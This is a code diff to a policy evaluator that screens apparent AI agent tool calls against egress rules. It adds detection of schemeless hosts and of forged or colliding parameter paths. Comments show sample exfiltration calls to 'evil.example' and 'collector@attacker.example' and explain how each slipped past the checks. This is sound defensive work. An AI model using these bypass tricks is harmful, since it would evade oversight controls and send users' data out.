@@ -69,6 +69,47 @@ WOULD_BLOCK_RULE_PREFIXES: tuple[str, ...] = (MONITOR_WOULD_BLOCK_PREFIX, POLICY
 # into disagreeing about what counts as sensitive.
 _EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
 _URL_RE = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.-]{1,31}://[^\s\"'<>\\]+")
+
+# A destination written WITHOUT a scheme, which `_URL_RE` cannot see.
+#
+# `destinations.hosts subsetOf ["api.acme.com"]` compiles to a counted comprehension over the
+# extracted hosts, and a comprehension over an EMPTY list counts zero — so a correctly-authored egress
+# rule was vacuously satisfied by a call that simply omitted `https://`:
+#
+#     http_get({"host": "evil.example", "path": "/collect", "q": "<customer table>"})
+#
+# Nothing there contains `://`, so every destination list came back empty and the constraint held.
+#
+# ANCHORED AT BOTH ENDS on purpose. Matching a host ANYWHERE in free text would harvest hosts out of
+# prose and log lines, and since these feed a `subsetOf` that direction OVER-blocks — it would refuse
+# legitimate calls because someone mentioned a domain in a message body. Requiring the whole value to
+# be the destination (optionally protocol-relative, optionally with a path) keeps false positives at
+# essentially zero while closing the shape an attacker actually uses.
+#
+# The TLD must be alphabetic and 2+ chars, so `v1.2.3` and `report.2026` do not match.
+#
+# `evil.example` and `report.txt` are STRUCTURALLY IDENTICAL, so shape alone cannot separate a bare
+# hostname from a filename — and the direction of that error matters: these feed a `subsetOf`, so a
+# filename harvested as a host makes a legitimate call fail an egress constraint it should pass.
+# Two signals are combined instead of one:
+#   * a MARKER a filename does not carry — a path, a port, or a `//` prefix — is decisive on its own;
+#   * a bare `a.b` with no marker is accepted only if its suffix is not a common file extension.
+# `.zip` and `.mov` really are TLDs, so this trades a rare miss (a bare host at one of those, with no
+# path and no port) for not breaking every call that mentions an attachment. Stated rather than
+# hidden, because it is a heuristic and the residual belongs in the threat model.
+_BARE_HOST_RE = re.compile(
+    r"^(?P<rel>//)?"                             # optional protocol-relative prefix
+    r"(?P<host>(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,24})"
+    r"(?P<port>:\d{1,5})?"                       # optional port
+    r"(?P<path>[/?#][^\s\"'<>\\]*)?$"            # optional path/query/fragment
+)
+_FILE_SUFFIXES = frozenset(
+    """txt pdf csv tsv json yaml yml xml html htm md log doc docx xls xlsx ppt pptx
+       png jpg jpeg gif svg webp ico bmp tiff mp3 mp4 wav avi webm
+       zip gz tar rar 7z bz2 xz
+       py js ts tsx jsx go rs java rb php sh bash sql rego conf cfg ini env
+       exe dll so dylib bin dat db sqlite bak tmp lock pem key crt cer""".split()
+)
 # Credential SHAPES, complementing masking's key-name list. Value-shape detection is what the
 # key-name list cannot do: a bare AWS key pair sitting in a free-text `body` has a perfectly
 # innocuous key. §11.5 recorded exactly that call being allowed on a live cluster.
@@ -735,7 +776,7 @@ class OPAEvaluator:
     def _derived_input(self, event: ToolCallEvent) -> dict:
         """Flattened/normalized views of the call, for policies that must not depend on param naming."""
         values = [v for v in self._walk_values(event.tool_params) if isinstance(v, str)]
-        paths = self._walk_paths(event.tool_params)
+        paths, ambiguous_paths = self._walk_paths(event.tool_params)
         sql_like = self._sql_candidate(values)
         # The abstract operation this call performs — read / write / delete / send / unknown. Already
         # computed for the console's capability surfaces but never reachable from Rego, so "allow reads
@@ -794,6 +835,11 @@ class OPAEvaluator:
             # Paths use dots for object keys and [i] for list indices: {"filters": {"ids": ["C-91"]}}
             # yields "filters.ids[0]".
             "param_paths": paths,
+            # Paths a caller could have MINTED — a key containing `.`/`[`/`]` forges nesting, and two
+            # routes reaching one path leave the winner to dict ordering. Published so a compiled
+            # constraint can refuse to hold over a path it cannot trust, instead of reading the
+            # attacker's chosen value as compliant. Empty on every honest call.
+            "param_paths_ambiguous": ambiguous_paths,
             # Egress targets, extracted once here rather than re-regexed inside every policy. Under
             # deny-by-default the destination IS the control: "may email acme.com" needs no detector
             # for what is being sent, which is the gap a detector list can never close (§11.5 — the
@@ -820,39 +866,65 @@ class OPAEvaluator:
     _MAX_PATH_VALUE_LEN = 4096
     _MAX_DESTINATIONS = 64
 
-    def _walk_paths(self, node: object) -> dict:
-        """Dotted path -> string value for every string leaf, bounded in depth, count and length.
+    def _walk_paths(self, node: object) -> tuple[dict, list[str]]:
+        """Dotted path -> string value for every string leaf, plus the paths that are AMBIGUOUS.
 
         Non-string leaves are omitted for the same reason `param_values` drops them: a policy that
         matched the string "1" against an integer 1 would be matching a coincidence of formatting.
+
+        WHY AMBIGUITY IS PUBLISHED. Keys come from the caller and the path grammar uses `.` and `[i]`
+        as structure, so a caller-supplied key containing either can MINT a path that is
+        indistinguishable from a genuinely nested one. That is not theoretical — it silently defeats
+        the constraint:
+
+            {"message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
+             "message.toRecipients[0].emailAddress.address": "ops@acme.com"}
+
+        Both routes produce the key `message.toRecipients[0].emailAddress.address`; whichever the
+        caller orders last wins the dict. A rule pinning that path to `^[^@]+@acme\\.com$` passed, and
+        the near-miss explainer reported the compliant value, while the tool received the attacker's.
+
+        Keys are still emitted VERBATIM — the original reasoning holds: an operator scopes against the
+        path they saw in a dry-run, and silently rewriting keys would make the screen disagree with
+        the policy. What changes is that a forged or colliding path is NAMED, so the compiler can
+        refuse to let a constraint over it hold. Deriving nothing and deriving a lie must not be
+        spelled the same way as deriving a compliant value.
         """
         out: dict[str, str] = {}
+        # Paths whose value cannot be trusted to describe one unambiguous position in the payload.
+        ambiguous: set[str] = set()
 
-        def walk(value: object, prefix: str, depth: int) -> None:
+        def walk(value: object, prefix: str, depth: int, forged: bool) -> None:
             if len(out) >= self._MAX_PATHS or depth > self._MAX_PATH_DEPTH:
                 return
             if isinstance(value, dict):
                 for key, child in value.items():
                     if len(out) >= self._MAX_PATHS:
                         return
-                    # Keys come from the caller, so a key containing a dot would forge a path that
-                    # looks nested. Left as-is rather than escaped: an intent matches on the path it
-                    # observes in a dry-run, and silently rewriting keys would make what the operator
-                    # sees differ from what they wrote.
-                    child_prefix = f"{prefix}.{key}" if prefix else str(key)
-                    walk(child, child_prefix[: self._MAX_PATH_KEY_LEN], depth + 1)
+                    text = str(key)
+                    # A key carrying path syntax is self-forging: everything beneath it inherits the
+                    # doubt, because the caller — not the structure — chose where the boundary falls.
+                    child_forged = forged or ("." in text) or ("[" in text) or ("]" in text)
+                    child_prefix = f"{prefix}.{text}" if prefix else text
+                    walk(child, child_prefix[: self._MAX_PATH_KEY_LEN], depth + 1, child_forged)
                 return
             if isinstance(value, (list, tuple)):
                 for index, child in enumerate(value):
                     if len(out) >= self._MAX_PATHS:
                         return
-                    walk(child, f"{prefix}[{index}]", depth + 1)
+                    walk(child, f"{prefix}[{index}]", depth + 1, forged)
                 return
             if isinstance(value, str) and prefix:
+                # A second arrival at one path means two different routes produced it — the collision
+                # itself, regardless of which key looked suspicious.
+                if prefix in out and out[prefix] != value[: self._MAX_PATH_VALUE_LEN]:
+                    ambiguous.add(prefix)
+                if forged:
+                    ambiguous.add(prefix)
                 out[prefix] = value[: self._MAX_PATH_VALUE_LEN]
 
-        walk(node, "", 0)
-        return out
+        walk(node, "", 0, False)
+        return out, sorted(ambiguous)
 
     def _destinations(self, values: list) -> dict:
         """Emails, URLs, hosts and schemes found anywhere in the params.
@@ -874,7 +946,18 @@ class OPAEvaluator:
                     schemes.add(parsed.scheme.lower())
                 if parsed.hostname:
                     hosts.add(parsed.hostname.lower())
-            if len(emails) + len(urls) > self._MAX_DESTINATIONS:
+            # A schemeless destination is still a destination. Only the HOST is recorded — not a url
+            # and not a scheme — because that is all the value actually asserts: inventing
+            # `https://evil.example/collect` from `evil.example/collect` would put a claim in the
+            # input document that the call never made, and `destinations.schemes` is used to reason
+            # about the protocol, which a schemeless value leaves genuinely unknown.
+            bare = _BARE_HOST_RE.match(raw.strip())
+            if bare:
+                host = bare.group("host").lower()
+                marked = bool(bare.group("rel") or bare.group("port") or bare.group("path"))
+                if marked or host.rsplit(".", 1)[-1] not in _FILE_SUFFIXES:
+                    hosts.add(host)
+            if len(emails) + len(urls) + len(hosts) > self._MAX_DESTINATIONS:
                 break
         cap = self._MAX_DESTINATIONS
         return {
